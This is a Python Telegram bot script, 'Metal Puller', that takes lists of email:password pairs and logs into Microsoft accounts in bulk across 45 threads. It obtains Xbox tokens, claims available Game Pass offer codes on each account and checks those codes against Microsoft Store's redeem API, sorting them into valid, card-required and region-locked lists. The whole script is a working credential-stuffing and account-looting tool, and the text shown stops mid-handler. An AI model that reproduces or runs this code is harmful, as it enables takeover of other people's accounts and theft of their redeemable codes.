#!/usr/bin/env python3
"""
METAL PULLER - TELEGRAM BOT EDITION
Designed for high performance execution on Railway via environmental variables.
Features: Pulling, Validation, Sorting, Live UI updates every 5 seconds, 
Thread control (40-50 workers), custom safe mechanisms, and asynchronous execution.
Language: English
"""

import os
import sys
import re
import json
import time
import random
import string
import uuid
import queue
import threading
import asyncio
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# Try to import external dependencies safely
try:
    import requests
except ImportError:
    print("Critical Error: 'requests' library is not installed. Run 'pip install requests'")
    sys.exit(1)

try:
    from aiogram import Bot, Dispatcher, F, types
    from aiogram.filters import Command
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
except ImportError:
    print("Critical Error: 'aiogram' (v3.x) library is not installed. Run 'pip install aiogram'")
    sys.exit(1)

# ============================================================================
# RAILWAY CONFIGURATION & ENVIRONMENT VARIABLES
# ============================================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = os.getenv("OWNER_ID", "YOUR_TELEGRAM_ID_HERE")

if OWNER_ID.isdigit():
    OWNER_ID = int(OWNER_ID)
else:
    print("Warning: OWNER_ID env variable is not a valid integer. Check your Railway configuration.")

# ============================================================================
# GLOBAL DATA STRUCTURES & LOCKS
# ============================================================================
print_lock = threading.Lock()
results_lock = threading.Lock()

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

# Active tasks repository for real-time progress tracking
ACTIVE_TASKS = {}

class BotStates(StatesGroup):
    waiting_for_accounts_check_validation = State()
    waiting_for_accounts_check_only = State()
    waiting_for_codes_to_sort = State()

# ============================================================================
# INTERIOR CORE ARCHITECTURE - HELPER ENGINE
# ============================================================================
def generate_reference_id():
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def extract_game_type(game_name):
    game_name = game_name.upper()
    if 'SUNSET SARSAPARILLA' in game_name:
        return '🥤 Sunset Sarsaparilla Bundle'
    elif 'RAINBOW SIX SIEGE' in game_name:
        return '🔫 Rainbow Six Siege'
    elif 'SKATE' in game_name:
        return '🛹 Skate Supercharge Pack'
    elif 'MADDEN NFL' in game_name:
        return '🏈 Madden NFL Supercharge Pack'
    elif 'WARFRAME' in game_name:
        return '⚔️ Warframe Bundle'
    elif 'THRONE AND LIBERTY' in game_name:
        return '👑 Throne and Liberty'
    elif 'DRIFT BUNDLE' in game_name:
        return '🚗 Drift Bundle'
    elif 'WINTER' in game_name and 'XBOX BENEFITS' in game_name:
        return '❄️ Winter Xbox Benefits Pack'
    elif 'JANG SAO' in game_name:
        return '🏆 Jang Sao Champions Bundle'
    elif 'PSO2:NGS' in game_name or 'PHANTASY STAR' in game_name:
        return '⭐ PSO2:NGS Monthly Bonus'
    elif 'XBOX GAME PASS' in game_name:
        return '🎮 Xbox Game Pass'
    elif 'BUNDLE' in game_name:
        return '🎁 Game Bundle'
    elif 'PACK' in game_name:
        return '📦 Game Pack'
    else:
        return '🎮 Other Games'

def format_game_codes_output(game_groups):
    lines = []
    sorted_groups = sorted(game_groups.items(), key=lambda x: (-len(x[1]), x[0]))
    
    lines.append("🎮 METAL PULLER - SORTED GAME CODES 🎮")
    lines.append("=" * 60)
    lines.append("")
    
    total_codes = 0
    code_counts_global = 0
    
    for game_type, codes_list in sorted_groups:
        count = len(codes_list)
        total_codes += count
        
        lines.append(f"📋 {game_type} ({count} codes)")
        lines.append("-" * 50)
        
        codes_list.sort(key=lambda x: x[0])
        code_counts = {}
        for code, game_name in codes_list:
            if code not in code_counts:
                code_counts[code] = []
            code_counts[code].append(game_name)
            
        code_counts_global += len(code_counts)
        
        for code, game_names in sorted(code_counts.items()):
            if len(game_names) == 1:
                lines.append(f"{code} | {game_names[0]}")
            else:
                lines.append(f"{code} (x{len(game_names)}) | {game_names[0]}")
                for game_name in game_names[1:]:
                    lines.append(f"{' ' * (len(code) + 3)}| {game_name}")
        lines.append("")
    
    lines.append("📊 SUMMARY REPORT")
    lines.append("=" * 60)
    lines.append(f"Total Unique Codes Discovered: {code_counts_global}")
    lines.append(f"Total Code Entries Logged: {total_codes}")
    lines.append(f"Game Categories Processed: {len(game_groups)}")
    lines.append(f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC")
    
    return "\n".join(lines) + "\n"

# ============================================================================
# PARSING MECHANICS FOR ACCOUNTS AND INPUTS
# ============================================================================
def parse_accounts_data(text_data: str):
    accounts = []
    lines = text_data.split('\n')
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts

# ============================================================================
# FETCHER BACKEND ENGINE - MS AUTHENTICATION
# ============================================================================
def fetch_oauth_tokens(session):
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=5)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return (None, None)
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match: return (None, None)
        return (match.group(1), ppft)
    except:
        return (None, None)

def fetch_login(session, email, password, url_post, ppft):
    try:
        resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                           headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=5)
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None': return token
        if 'cancel?mkt=' in resp.text:
            ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
            pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
            uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
            if ipt and pprid and uaid and action:
                ret = session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=5)
                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
                if return_url:
                    fin = session.get(return_url.group(), allow_redirects=True, timeout=5)
                    if '#' in fin.url:
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                        if token != 'None': return token
        return None
    except:
        return None

def get_xbox_tokens(session, rps_token):
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=5)
        if resp.status_code != 200: return (None, None)
        user_token = resp.json().get('Token')
        
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=5)
        if resp.status_code != 200: return (None, None)
        data = resp.json()
        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
    except:
        return (None, None)

def fetch_codes_from_xbox(session, uhs, xsts_token):
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=5)
        if resp.status_code != 200: return []
        
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
            elif offer.get('offerStatus') == 'available':
                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
                    headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
                    data='', timeout=5)
                if claim_resp.status_code == 200:
                    code = claim_resp.json().get('resource')
                    if code: codes.append(code)
        return codes
    except:
        return []

def fetch_account_worker_standalone(email, password):
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post: return False, [], "Auth failed"
        
        rps = fetch_login(session, email, password, url_post, ppft)
        if not rps: return False, [], "Login failed"
        
        uhs, xsts = get_xbox_tokens(session, rps)
        if not uhs: return False, [], "Xbox tokens failed"
        
        codes = fetch_codes_from_xbox(session, uhs, xsts)
        return True, codes, f"Success ({len(codes)} codes)"
    except Exception as e:
        return False, [], f"Error: {str(e)}"
    finally:
        session.close()

# ============================================================================
# VALIDATOR BACKEND ENGINE - MS CORE DYNAMICS CHECKER
# ============================================================================
def login_microsoft_account(email, password):
    session = requests.Session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://account.microsoft.com/',
        'Origin': 'https://account.microsoft.com',
        'Upgrade-Insecure-Requests': '1',
    }
    try:    
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            timeout=10
        )
        login_request = login_response.text.replace('\\', '')
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
        if not reurl_match: return None
        reurl = reurl_match.group(1)
        
        try:
            reresp = session.get(reurl, timeout=10).text
        except Exception:
            return None
            
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch: return None
        acu = actch.group(1)
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        fta = {name: value for name, value in input_matches}
        
        try:
            final_response = session.post(acu, data=fta, allow_redirects=True, timeout=10)
            if final_response.status_code != 200: return None
        except Exception:
            return None
        return session
    except Exception:
        return None

def get_auth_token(session, force_refresh=False):
    try:
        if not force_refresh and hasattr(session, 'wlid_token'):
            return session.wlid_token
        session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=5)
        token_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://account.microsoft.com/billing/redeem'
        }
        token_response = session.get(
            'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
            params={'scopes': 'MSComServiceMBISSL'},
            headers=token_headers,
            timeout=5
        )
        if token_response.status_code != 200: return None
        token_data = token_response.json()
        if not token_data: return None
        token = token_data[0]['token']
        session.wlid_token = token
        return token
    except Exception:
        return None

def get_store_cart_state(session, force_refresh=False):
    try:
        if force_refresh and hasattr(session, 'store_state'):
            delattr(session, 'store_state')
        if not force_refresh and hasattr(session, 'store_state'):
            return session.store_state
            
        token = get_auth_token(session, force_refresh)
        if not token: return None
        
        ms_cv = "xddT7qMNbECeJpTq.6.2"
        url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
        params = {
            'ms-cv': ms_cv,
            'market': 'US',
            'locale': 'en-GB',
            'clientName': 'AccountMicrosoftCom'
        }
        payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
        
        response = session.post(url, params=params, data=payload, timeout=10)
        text = response.text
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
        if not match: return None
        
        store_state = json.loads(match.group(1))
        extracted_values = {
            'ms_cv': store_state.get('appContext', {}).get('cv', ''),
            'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
            'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
            'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
            'muid': store_state.get('appContext', {}).get('muid', ''),
            'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
        }
        session.store_state = extracted_values
        return extracted_values
    except Exception:
        return None

def prepare_redeem_api_call(session, code, headers, payload):
    try:
        return session.post(
            'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
            headers=headers,
            json=payload,
            timeout=5
        )
    except Exception:
        return None

def validate_code_primary(session, code, force_refresh_ids=False):
    try:
        if not code or len(code) < 5 or ' ' in code or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
            return {"status": "INVALID", "message": "Invalid code format"}
        
        store_state = get_store_cart_state(session, force_refresh=force_refresh_ids)
        if not store_state:
            store_state = get_store_cart_state(session, force_refresh=True)
            if not store_state: return {"status": "ERROR", "message": "Failed to get store cart state"}
        
        token = get_auth_token(session, force_refresh=force_refresh_ids)
        if not token:
            token = get_auth_token(session, force_refresh=True)
            if not token: return {"status": "ERROR", "message": "Failed to get authentication token"}
        
        headers = {
            "host": "buynow.production.store-web.dynamics.com",
            "connection": "keep-alive",
            "x-ms-tracking-id": store_state['tracking_id'],
            "sec-ch-ua-platform": "\"Windows\"",
            "authorization": f"WLID1.0=t={token}",
            "x-ms-client-type": "AccountMicrosoftCom",
            "x-ms-market": "US",
            "ms-cv": store_state['ms_cv'],
            "x-ms-reference-id": generate_reference_id(),
            "x-ms-vector-id": store_state['vector_id'],
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
            "x-ms-correlation-id": store_state['correlation_id'],
            "content-type": "application/json",
            "x-authorization-muid": store_state['alternative_muid'],
            "accept": "*/*",
            "origin": "https://www.microsoft.com",
            "referer": "https://www.microsoft.com/",
            "accept-language": "en-US,en;q=0.9"
        }
        payload = {
            "market": "US",
            "language": "en-US",
            "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_checkoutredeem"],
            "tokenIdentifierValue": code,
            "supportsCsvTypeTokenOnly": False,
            "buyNowScenario": "redeem",
            "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
        }

        response = prepare_redeem_api_call(session, code, headers, payload)
        if not response: return {"status": "ERROR", "message": "Request failed"}
        if response.status_code == 429: return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
        if response.status_code != 200: return {"status": "ERROR", "message": f"Status code {response.status_code}"}
        
        data = response.json()
        if "tokenType" in data and data["tokenType"] == "CSV":
            return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
        if "errorCode" in data and data["errorCode"] == "TooManyRequests":
            return {"status": "RATE_LIMITED", "message": "Account rate limited"}
        
        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            cart_event = data["events"]["cart"][0]
            if "data" in cart_event and "reason" in cart_event["data"]:
                reason = cart_event["data"]["reason"]
                if "TooManyRequests" in reason or "RateLimit" in reason:
                    return {"status": "RATE_LIMITED", "message": f"Rate limited: {reason}"}
                if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"]:
                    return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                elif reason == "RedeemTokenStateDeactivated": return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
                elif reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
                elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]: return {"status": "INVALID", "message": f"{code} | INVALID"}
        
        if "products" in data and len(data["products"]) > 0:
            product_info = data.get("productInfos", [{}])[0]
            product_id = product_info.get("productId")
            for product in data["products"]:
                if product.get("id") == product_id:
                    product_title = product.get("sku", {}).get("title", product.get("title", "Unknown Title"))
                    is_pi_required = product_info.get("isPIRequired", False)
                    status_lbl = "VALID_REQUIRES_CARD" if is_pi_required else "VALID"
                    return {"status": status_lbl, "product_title": product_title, "message": f"{code} | {product_title}"}
        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
    except Exception as e:
        return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}

# ============================================================================
# ORCHESTRATION PIPELINES (THE THREE POWER MODES)
# ============================================================================
def execute_check_and_validation_pipeline(task_id, accounts):
    """
    Mode 1: Full pulling from Microsoft Accounts followed by high speed 
    validation of extracted credentials into designated txt outputs.
    """
    task = ACTIVE_TASKS[task_id]
    total_accs = len(accounts)
    
    # 1. Pulling phase
    task["status_msg"] = "Phase 1/2: Pulling codes from MS Accounts..."
    pulled_codes_pool = []
    
    with ThreadPoolExecutor(max_workers=45) as executor:
        futures = {executor.submit(fetch_account_worker_standalone, acc[0], acc[1]): acc for acc in accounts}
        for future in as_completed(futures):
            if task["stop_requested"]: break
            success, codes, msg = future.result()
            task["total_pulled_accounts"] += 1
            if success:
                pulled_codes_pool.extend(codes)
                task["total_pulled_codes"] += len(codes)
    
    if task["stop_requested"]:
        task["status_msg"] = "Interrupted by user via /stop"
        task["is_running"] = False
        return

    # De-duplicate pulled codes
    unique_codes = list(set(pulled_codes_pool))
    task["total_codes_to_check"] = len(unique_codes)
    
    # 2. Validation Phase
    task["status_msg"] = f"Phase 2/2: Validating {len(unique_codes)} codes..."
    
    # Pre-login checking nodes to optimize performance
    active_sessions = []
    for acc in accounts[:10]: # Limit login infrastructure to prevent overkill
        sess = login_microsoft_account(acc[0], acc[1])
        if sess: active_sessions.append((sess, acc[0]))
        if len(active_sessions) >= 3: break
        
    if not active_sessions:
        task["status_msg"] = "Pipeline aborted: Failed to authenticate validation accounts."
        task["is_running"] = False
        return

    code_queue = queue.Queue()
    for c in unique_codes: code_queue.put(c)
    
    def validator_thread_loop(session_obj, email_addr):
        while not code_queue.empty() and not task["stop_requested"]:
            try:
                code_item = code_queue.get_nowait()
            except queue.Empty:
                break
                
            res = validate_code_primary(session_obj, code_item)
            status = res.get("status", "ERROR")
            msg = res.get("message", f"{code_item} | {status}")
            
            with results_lock:
                task["total_checked_codes"] += 1
                if status in ['VALID', 'BALANCE_CODE']:
                    task["valid_list"].append(msg)
                elif status == 'VALID_REQUIRES_CARD':
                    task["valid_card_list"].append(msg)
                elif status in ['REDEEMED', 'EXPIRED', 'DEACTIVATED', 'INVALID']:
                    task["invalid_list"].append(msg)
                elif status == 'REGION_LOCKED':
                    task["region_locked_list"].append(msg)
                else:
                    task["unknown_list"].append(msg)
            code_queue.task_done()

    threads = []
    for idx, (sess, mail) in enumerate(active_sessions):
        t = threading.Thread(target=validator_thread_loop, args=(sess, mail))
        t.start()
        threads.append(t)
        
    for t in threads: t.join()
    
    task["status_msg"] = "Pipeline operations completed successfully."
    task["is_running"] = False

def execute_check_only_pipeline(task_id, accounts):
    """
    Mode 2: Pull-Only framework. Logs into all accounts via thread nodes,
    collects all codes, and skips the dynamics validation step.
    """
    task = ACTIVE_TASKS[task_id]
    task["status_msg"] = "Executing High-Performance Pull Operations..."
    
    with ThreadPoolExecutor(max_workers=45) as executor:
        futures = {executor.submit(fetch_account_worker_standalone, acc[0], acc[1]): acc for acc in accounts}
        for future in as_completed(futures):
            if task["stop_requested"]: break
            success, codes, msg = future.result()
            task["total_pulled_accounts"] += 1
            if success:
                task["total_pulled_codes"] += len(codes)
                with results_lock:
                    for c in codes:
                        task["valid_list"].append(f"{c} | Extracted Offer")
                        
    task["status_msg"] = "Pull operations finished."
    task["is_running"] = False

# ============================================================================
# TELEGRAM TELEMETRY & INLINE UI SYSTEM
# ============================================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

def make_dashboard_markup(task_id, finished=False):
    kb = []
    if not finished:
        kb.append([InlineKeyboardButton(text="🛑 Force Terminate (Stop)", callback_data=f"stop_{task_id}")])
    else:
        kb.append([InlineKeyboardButton(text="🔄 Return to Dashboard Menu", callback_data="back_main")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

async def live_results_monitoring_loop(msg_obj: types.Message, task_id: str, pipeline_mode: str):
    """
    Refreshes the live dashboard on the Telegram UI precisely every 5 seconds.
    Outputs metrics, pulled items, and comprehensive statistics.
    """
    last_text = ""
    while True:
        await asyncio.sleep(5)
        if task_id not in ACTIVE_TASKS: break
        
        task = ACTIVE_TASKS[task_id]
        
        # Calculate dynamic variables
        elapsed = int(time.time() - task["start_time"])
        cpm = int((task["total_checked_codes"] / elapsed) * 60) if elapsed > 0 else 0
        if pipeline_mode == "check_only":
            cpm = int((task["total_pulled_accounts"] / elapsed) * 60) if elapsed > 0 else 0

        dashboard_ui = (
            f"⚡ <b>METAL PULLER LIVE DASHBOARD</b> ⚡\n"
            f"==================================\n"
            f"⚙️ <b>Pipeline Mode:</b> {pipeline_mode.upper()}\n"
            f"ℹ️ <b>Status:</b> {task['status_msg']}\n"
            f"⏱️ <b>Time Elapsed:</b> {elapsed}s | <b>Est. CPM:</b> {cpm}\n"
            f"==================================\n"
            f"👥 <b>Accounts Loaded:</b> {task['total_pulled_accounts']}\n"
            f"🎁 <b>Total Codes Found:</b> {task['total_pulled_codes']}\n"
        )
        
        if pipeline_mode == "check_validation":
            dashboard_ui += (
                f"📥 <b>Validation Progress:</b> {task['total_checked_codes']}/{task['total_codes_to_check']}\n"
                f"🟢 <b>Valid (Clean):</b> {len(task['valid_list'])}\n"
                f"🟡 <b>Valid (Card Req):</b> {len(task['valid_card_list'])}\n"
                f"🔵 <b>Region Locked:</b> {len(task['region_locked_list'])}\n"
                f"🔴 <b>Invalid Codes:</b> {len(task['invalid_list'])}\n"
                f"⚪ <b>Unknown Status:</b> {len(task['unknown_list'])}\n"
            )
            
        dashboard_ui += f"==================================\n"
        dashboard_ui += f"📡 <i>Live results refresh automatically every 5s</i>"

        if dashboard_ui != last_text:
            try:
                await msg_obj.edit_text(dashboard_ui, reply_markup=make_dashboard_markup(task_id), parse_mode="HTML")
                last_text = dashboard_ui
            except Exception:
                pass
                
        if not task["is_running"]:
            break

    # Final summary compile
    await transmit_completed_manifest_outputs(msg_obj, task_id, pipeline_mode)

async def transmit_completed_manifest_outputs(msg_obj: types.Message, task_id: str, pipeline_mode: str):
    task = ACTIVE_TASKS[task_id]
    await msg_obj.reply("🏁 <b>Pipeline sequence finalized. Compiling output packages...</b>", parse_mode="HTML")
    
    # Helper to generate input file inside memory buffers
    def build_buffer(data_list):
        return BufferedInputFile("\n".join(data_list).encode('utf-8'), filename="output.txt")

    if pipeline_mode == "check_validation":
        if task["valid_list"]:
            await msg_obj.reply_document(document=build_buffer(task["valid_list"]), caption="🟢 valid_codes.txt")
        if task["valid_card_list"]:
            await msg_obj.reply_document(document=build_buffer(task["valid_card_list"]), caption="🟡 valid_cardrequired_codes.txt")
        if task["region_locked_list"]:
            await msg_obj.reply_document(document=build_buffer(task["region_locked_list"]), caption="🌍 region_locked_codes.txt")
        if task["invalid_list"]:
            await msg_obj.reply_document(document=build_buffer(task["invalid_list"]), caption="❌ invalid.txt")
        if task["unknown_list"]:
            await msg_obj.reply_document(document=build_buffer(task["unknown_list"]), caption="❓ unknown_codes.txt")
            
    elif pipeline_mode == "check_only":
        if task["valid_list"]:
            clean_codes = [c.split(" | ")[0] for c in task["valid_list"]]
            await msg_obj.reply_document(document=build_buffer(clean_codes), caption="📥 pulled_codes.txt")
            
    # Cleanup memory trace
    if task_id in ACTIVE_TASKS:
        del ACTIVE_TASKS[task_id]

# ============================================================================
# BOT COMMAND HANDLERS & NAVIGATION INTERFACES
# ============================================================================
def build_welcome_menu():
    buttons = [
        [InlineKeyboardButton(text="⚡ Check And Validation", callback_data="menu_check_val")],
        [InlineKeyboardButton(text="📥 Check (Pull Only)", callback_data="menu_check_only")],
        [InlineKeyboardButton(text="🔮 Sort Categories", callback_data="menu_sort")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.message(Command("start"))
async def start_cmd_handler(message: types.Message, state: FSMContext):
    if OWNER_ID and message.from_user.id != OWNER_ID:
        await message.reply("❌ Access Denied: You are not authorized to use Metal Puller.")
        return
        
    await state.clear()
    welcome_text = (
        "🤖 <b>Welcome to Metal Puller Bot Platform!</b>\n"
        "=========================================\n"
        "High performance structural script engineered for \n"
        "rapid async Microsoft / Xbox data sourcing.\n\n"
        "Select your operation mode from the control panel below:"
    )
    await message.reply(welcome_text, reply_markup=build_welcome_menu(), parse_mode="HTML")

@dp.message(Command("stop"))
async def stop_cmd_handler(message: types.Message):
    if OWNER_ID and message.from_user.id != OWNER_ID: return
    
    if not ACTIVE_TASKS:
        await message.reply("ℹ️ No operational automation sequences are currently active.")
        return
        
    for tid, tdata in ACTIVE_TASKS.items():
        tdata["stop_requested"] = True
        tdata["is_running"] = False
        tdata["status_msg"] = "Termination requested via command."
        
    await message.reply("🛑 <b>Termination command signaled globally to all background workers.</b>", parse_mode="HTML")

# ============================================================================
# CALLBACK ROUTERS
# ============================================================================
@dp.callback_query(F.data == "back_main")
async def back_main_callback(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    welcome_text = (
        "🤖 <b>Welcome to Metal Puller Bot Platform!</b>\n"
        "=========================================\n"
        "Select your operation mode from the control panel below:"
    )
    await callback.message.edit_text(welcome_text, reply_markup=build_welcome_menu(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("stop_"))
async def stop_button_callback(callback: types.CallbackQuery):
    tid = callback.data.split("_")[1]
    if tid in ACTIVE_TASKS:
        ACTIVE_TASKS[tid]["stop_requested"] = True
        ACTIVE_TASKS[tid]["is_running"] = False
        ACTIVE_TASKS[tid]["status_msg"] = "Terminated via control panel button."
        await callback.answer("Signaling worker cleanup sequence...")
    else:
        await callback.answer("Task sequence already inactive.")

@dp.callback_query(F.data == "menu_check_val")
async def check_val_callback(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "📝 <b>Mode: Check And Validation</b>\n\n"
        "Please send the account configuration list in the following format:\n"
        "<code>email:password</code>\n"
        "<code>email:password</code>",
        parse_mode="HTML"
    )
    await state.set_state(BotStates.waiting_for_accounts_check_validation)

@dp.callback_query(F.data == "menu_check_only")
async def check_only_callback(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "📥 <b>Mode: Check (Pull Only)</b>\n\n"
        "Please transmit your account credentials array matching the raw criteria:\n"
        "<code>email:password</code>",
        parse_mode="HTML"
    )
    await state.set_state(BotStates.waiting_for_accounts_check_only)

@dp.callback_query(F.data == "menu_sort")
async def sort_callback(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "🔮 <b>Mode: Lexical Sort Engine</b>\n\n"
        "Please drop your raw code arrays to structure them into item modules:\n"
        "Format: <code>CODE | Title Name</code> or raw strings.",
        parse_mode="HTML"
    )
    await state.set_state(BotStates.waiting_for_codes_to_sort)

# ============================================================================
# STATE TRANSITION INGESTION PROCESSING
# ============================================================================
@dp.message(BotStates.waiting_for_accounts_check_validation)
async def process_check_val_input(message: types.Message, state: FSMContext):
    accs = parse_accounts_data(message.text)
    if not accs:
        await message.reply("❌ Input string contains zero executable account arrays. Try again.")
        return
        
    await state.clear()
    task_id = str(uuid.uuid4())[:8]
    ACTIVE_TASKS[task_id] = {
        "start_time": time.time(),
        "is_running": True,
        "stop_requested": False,
        "status_msg": "Initializing pipeline structure...",
        "total_pulled_accounts": 0,
        "total_pulled_codes": 0,
        "total_codes_to_check": 0,
        "total_checked_codes": 0,
        "valid_list": [],
        "valid_card_list": [],
        "invalid_list": [],
        "region_locked_list": [],
        "unknown_list": []
    }
    
    monitoring_msg = await message.reply("⚡ <b>Spawning validation infrastructure layers...</b>", parse_mode="HTML")
    
    # Offload thread pool matrix execution safely
    threading.Thread(target=execute_check_and_validation_pipeline, args=(task_id, accs)).start()
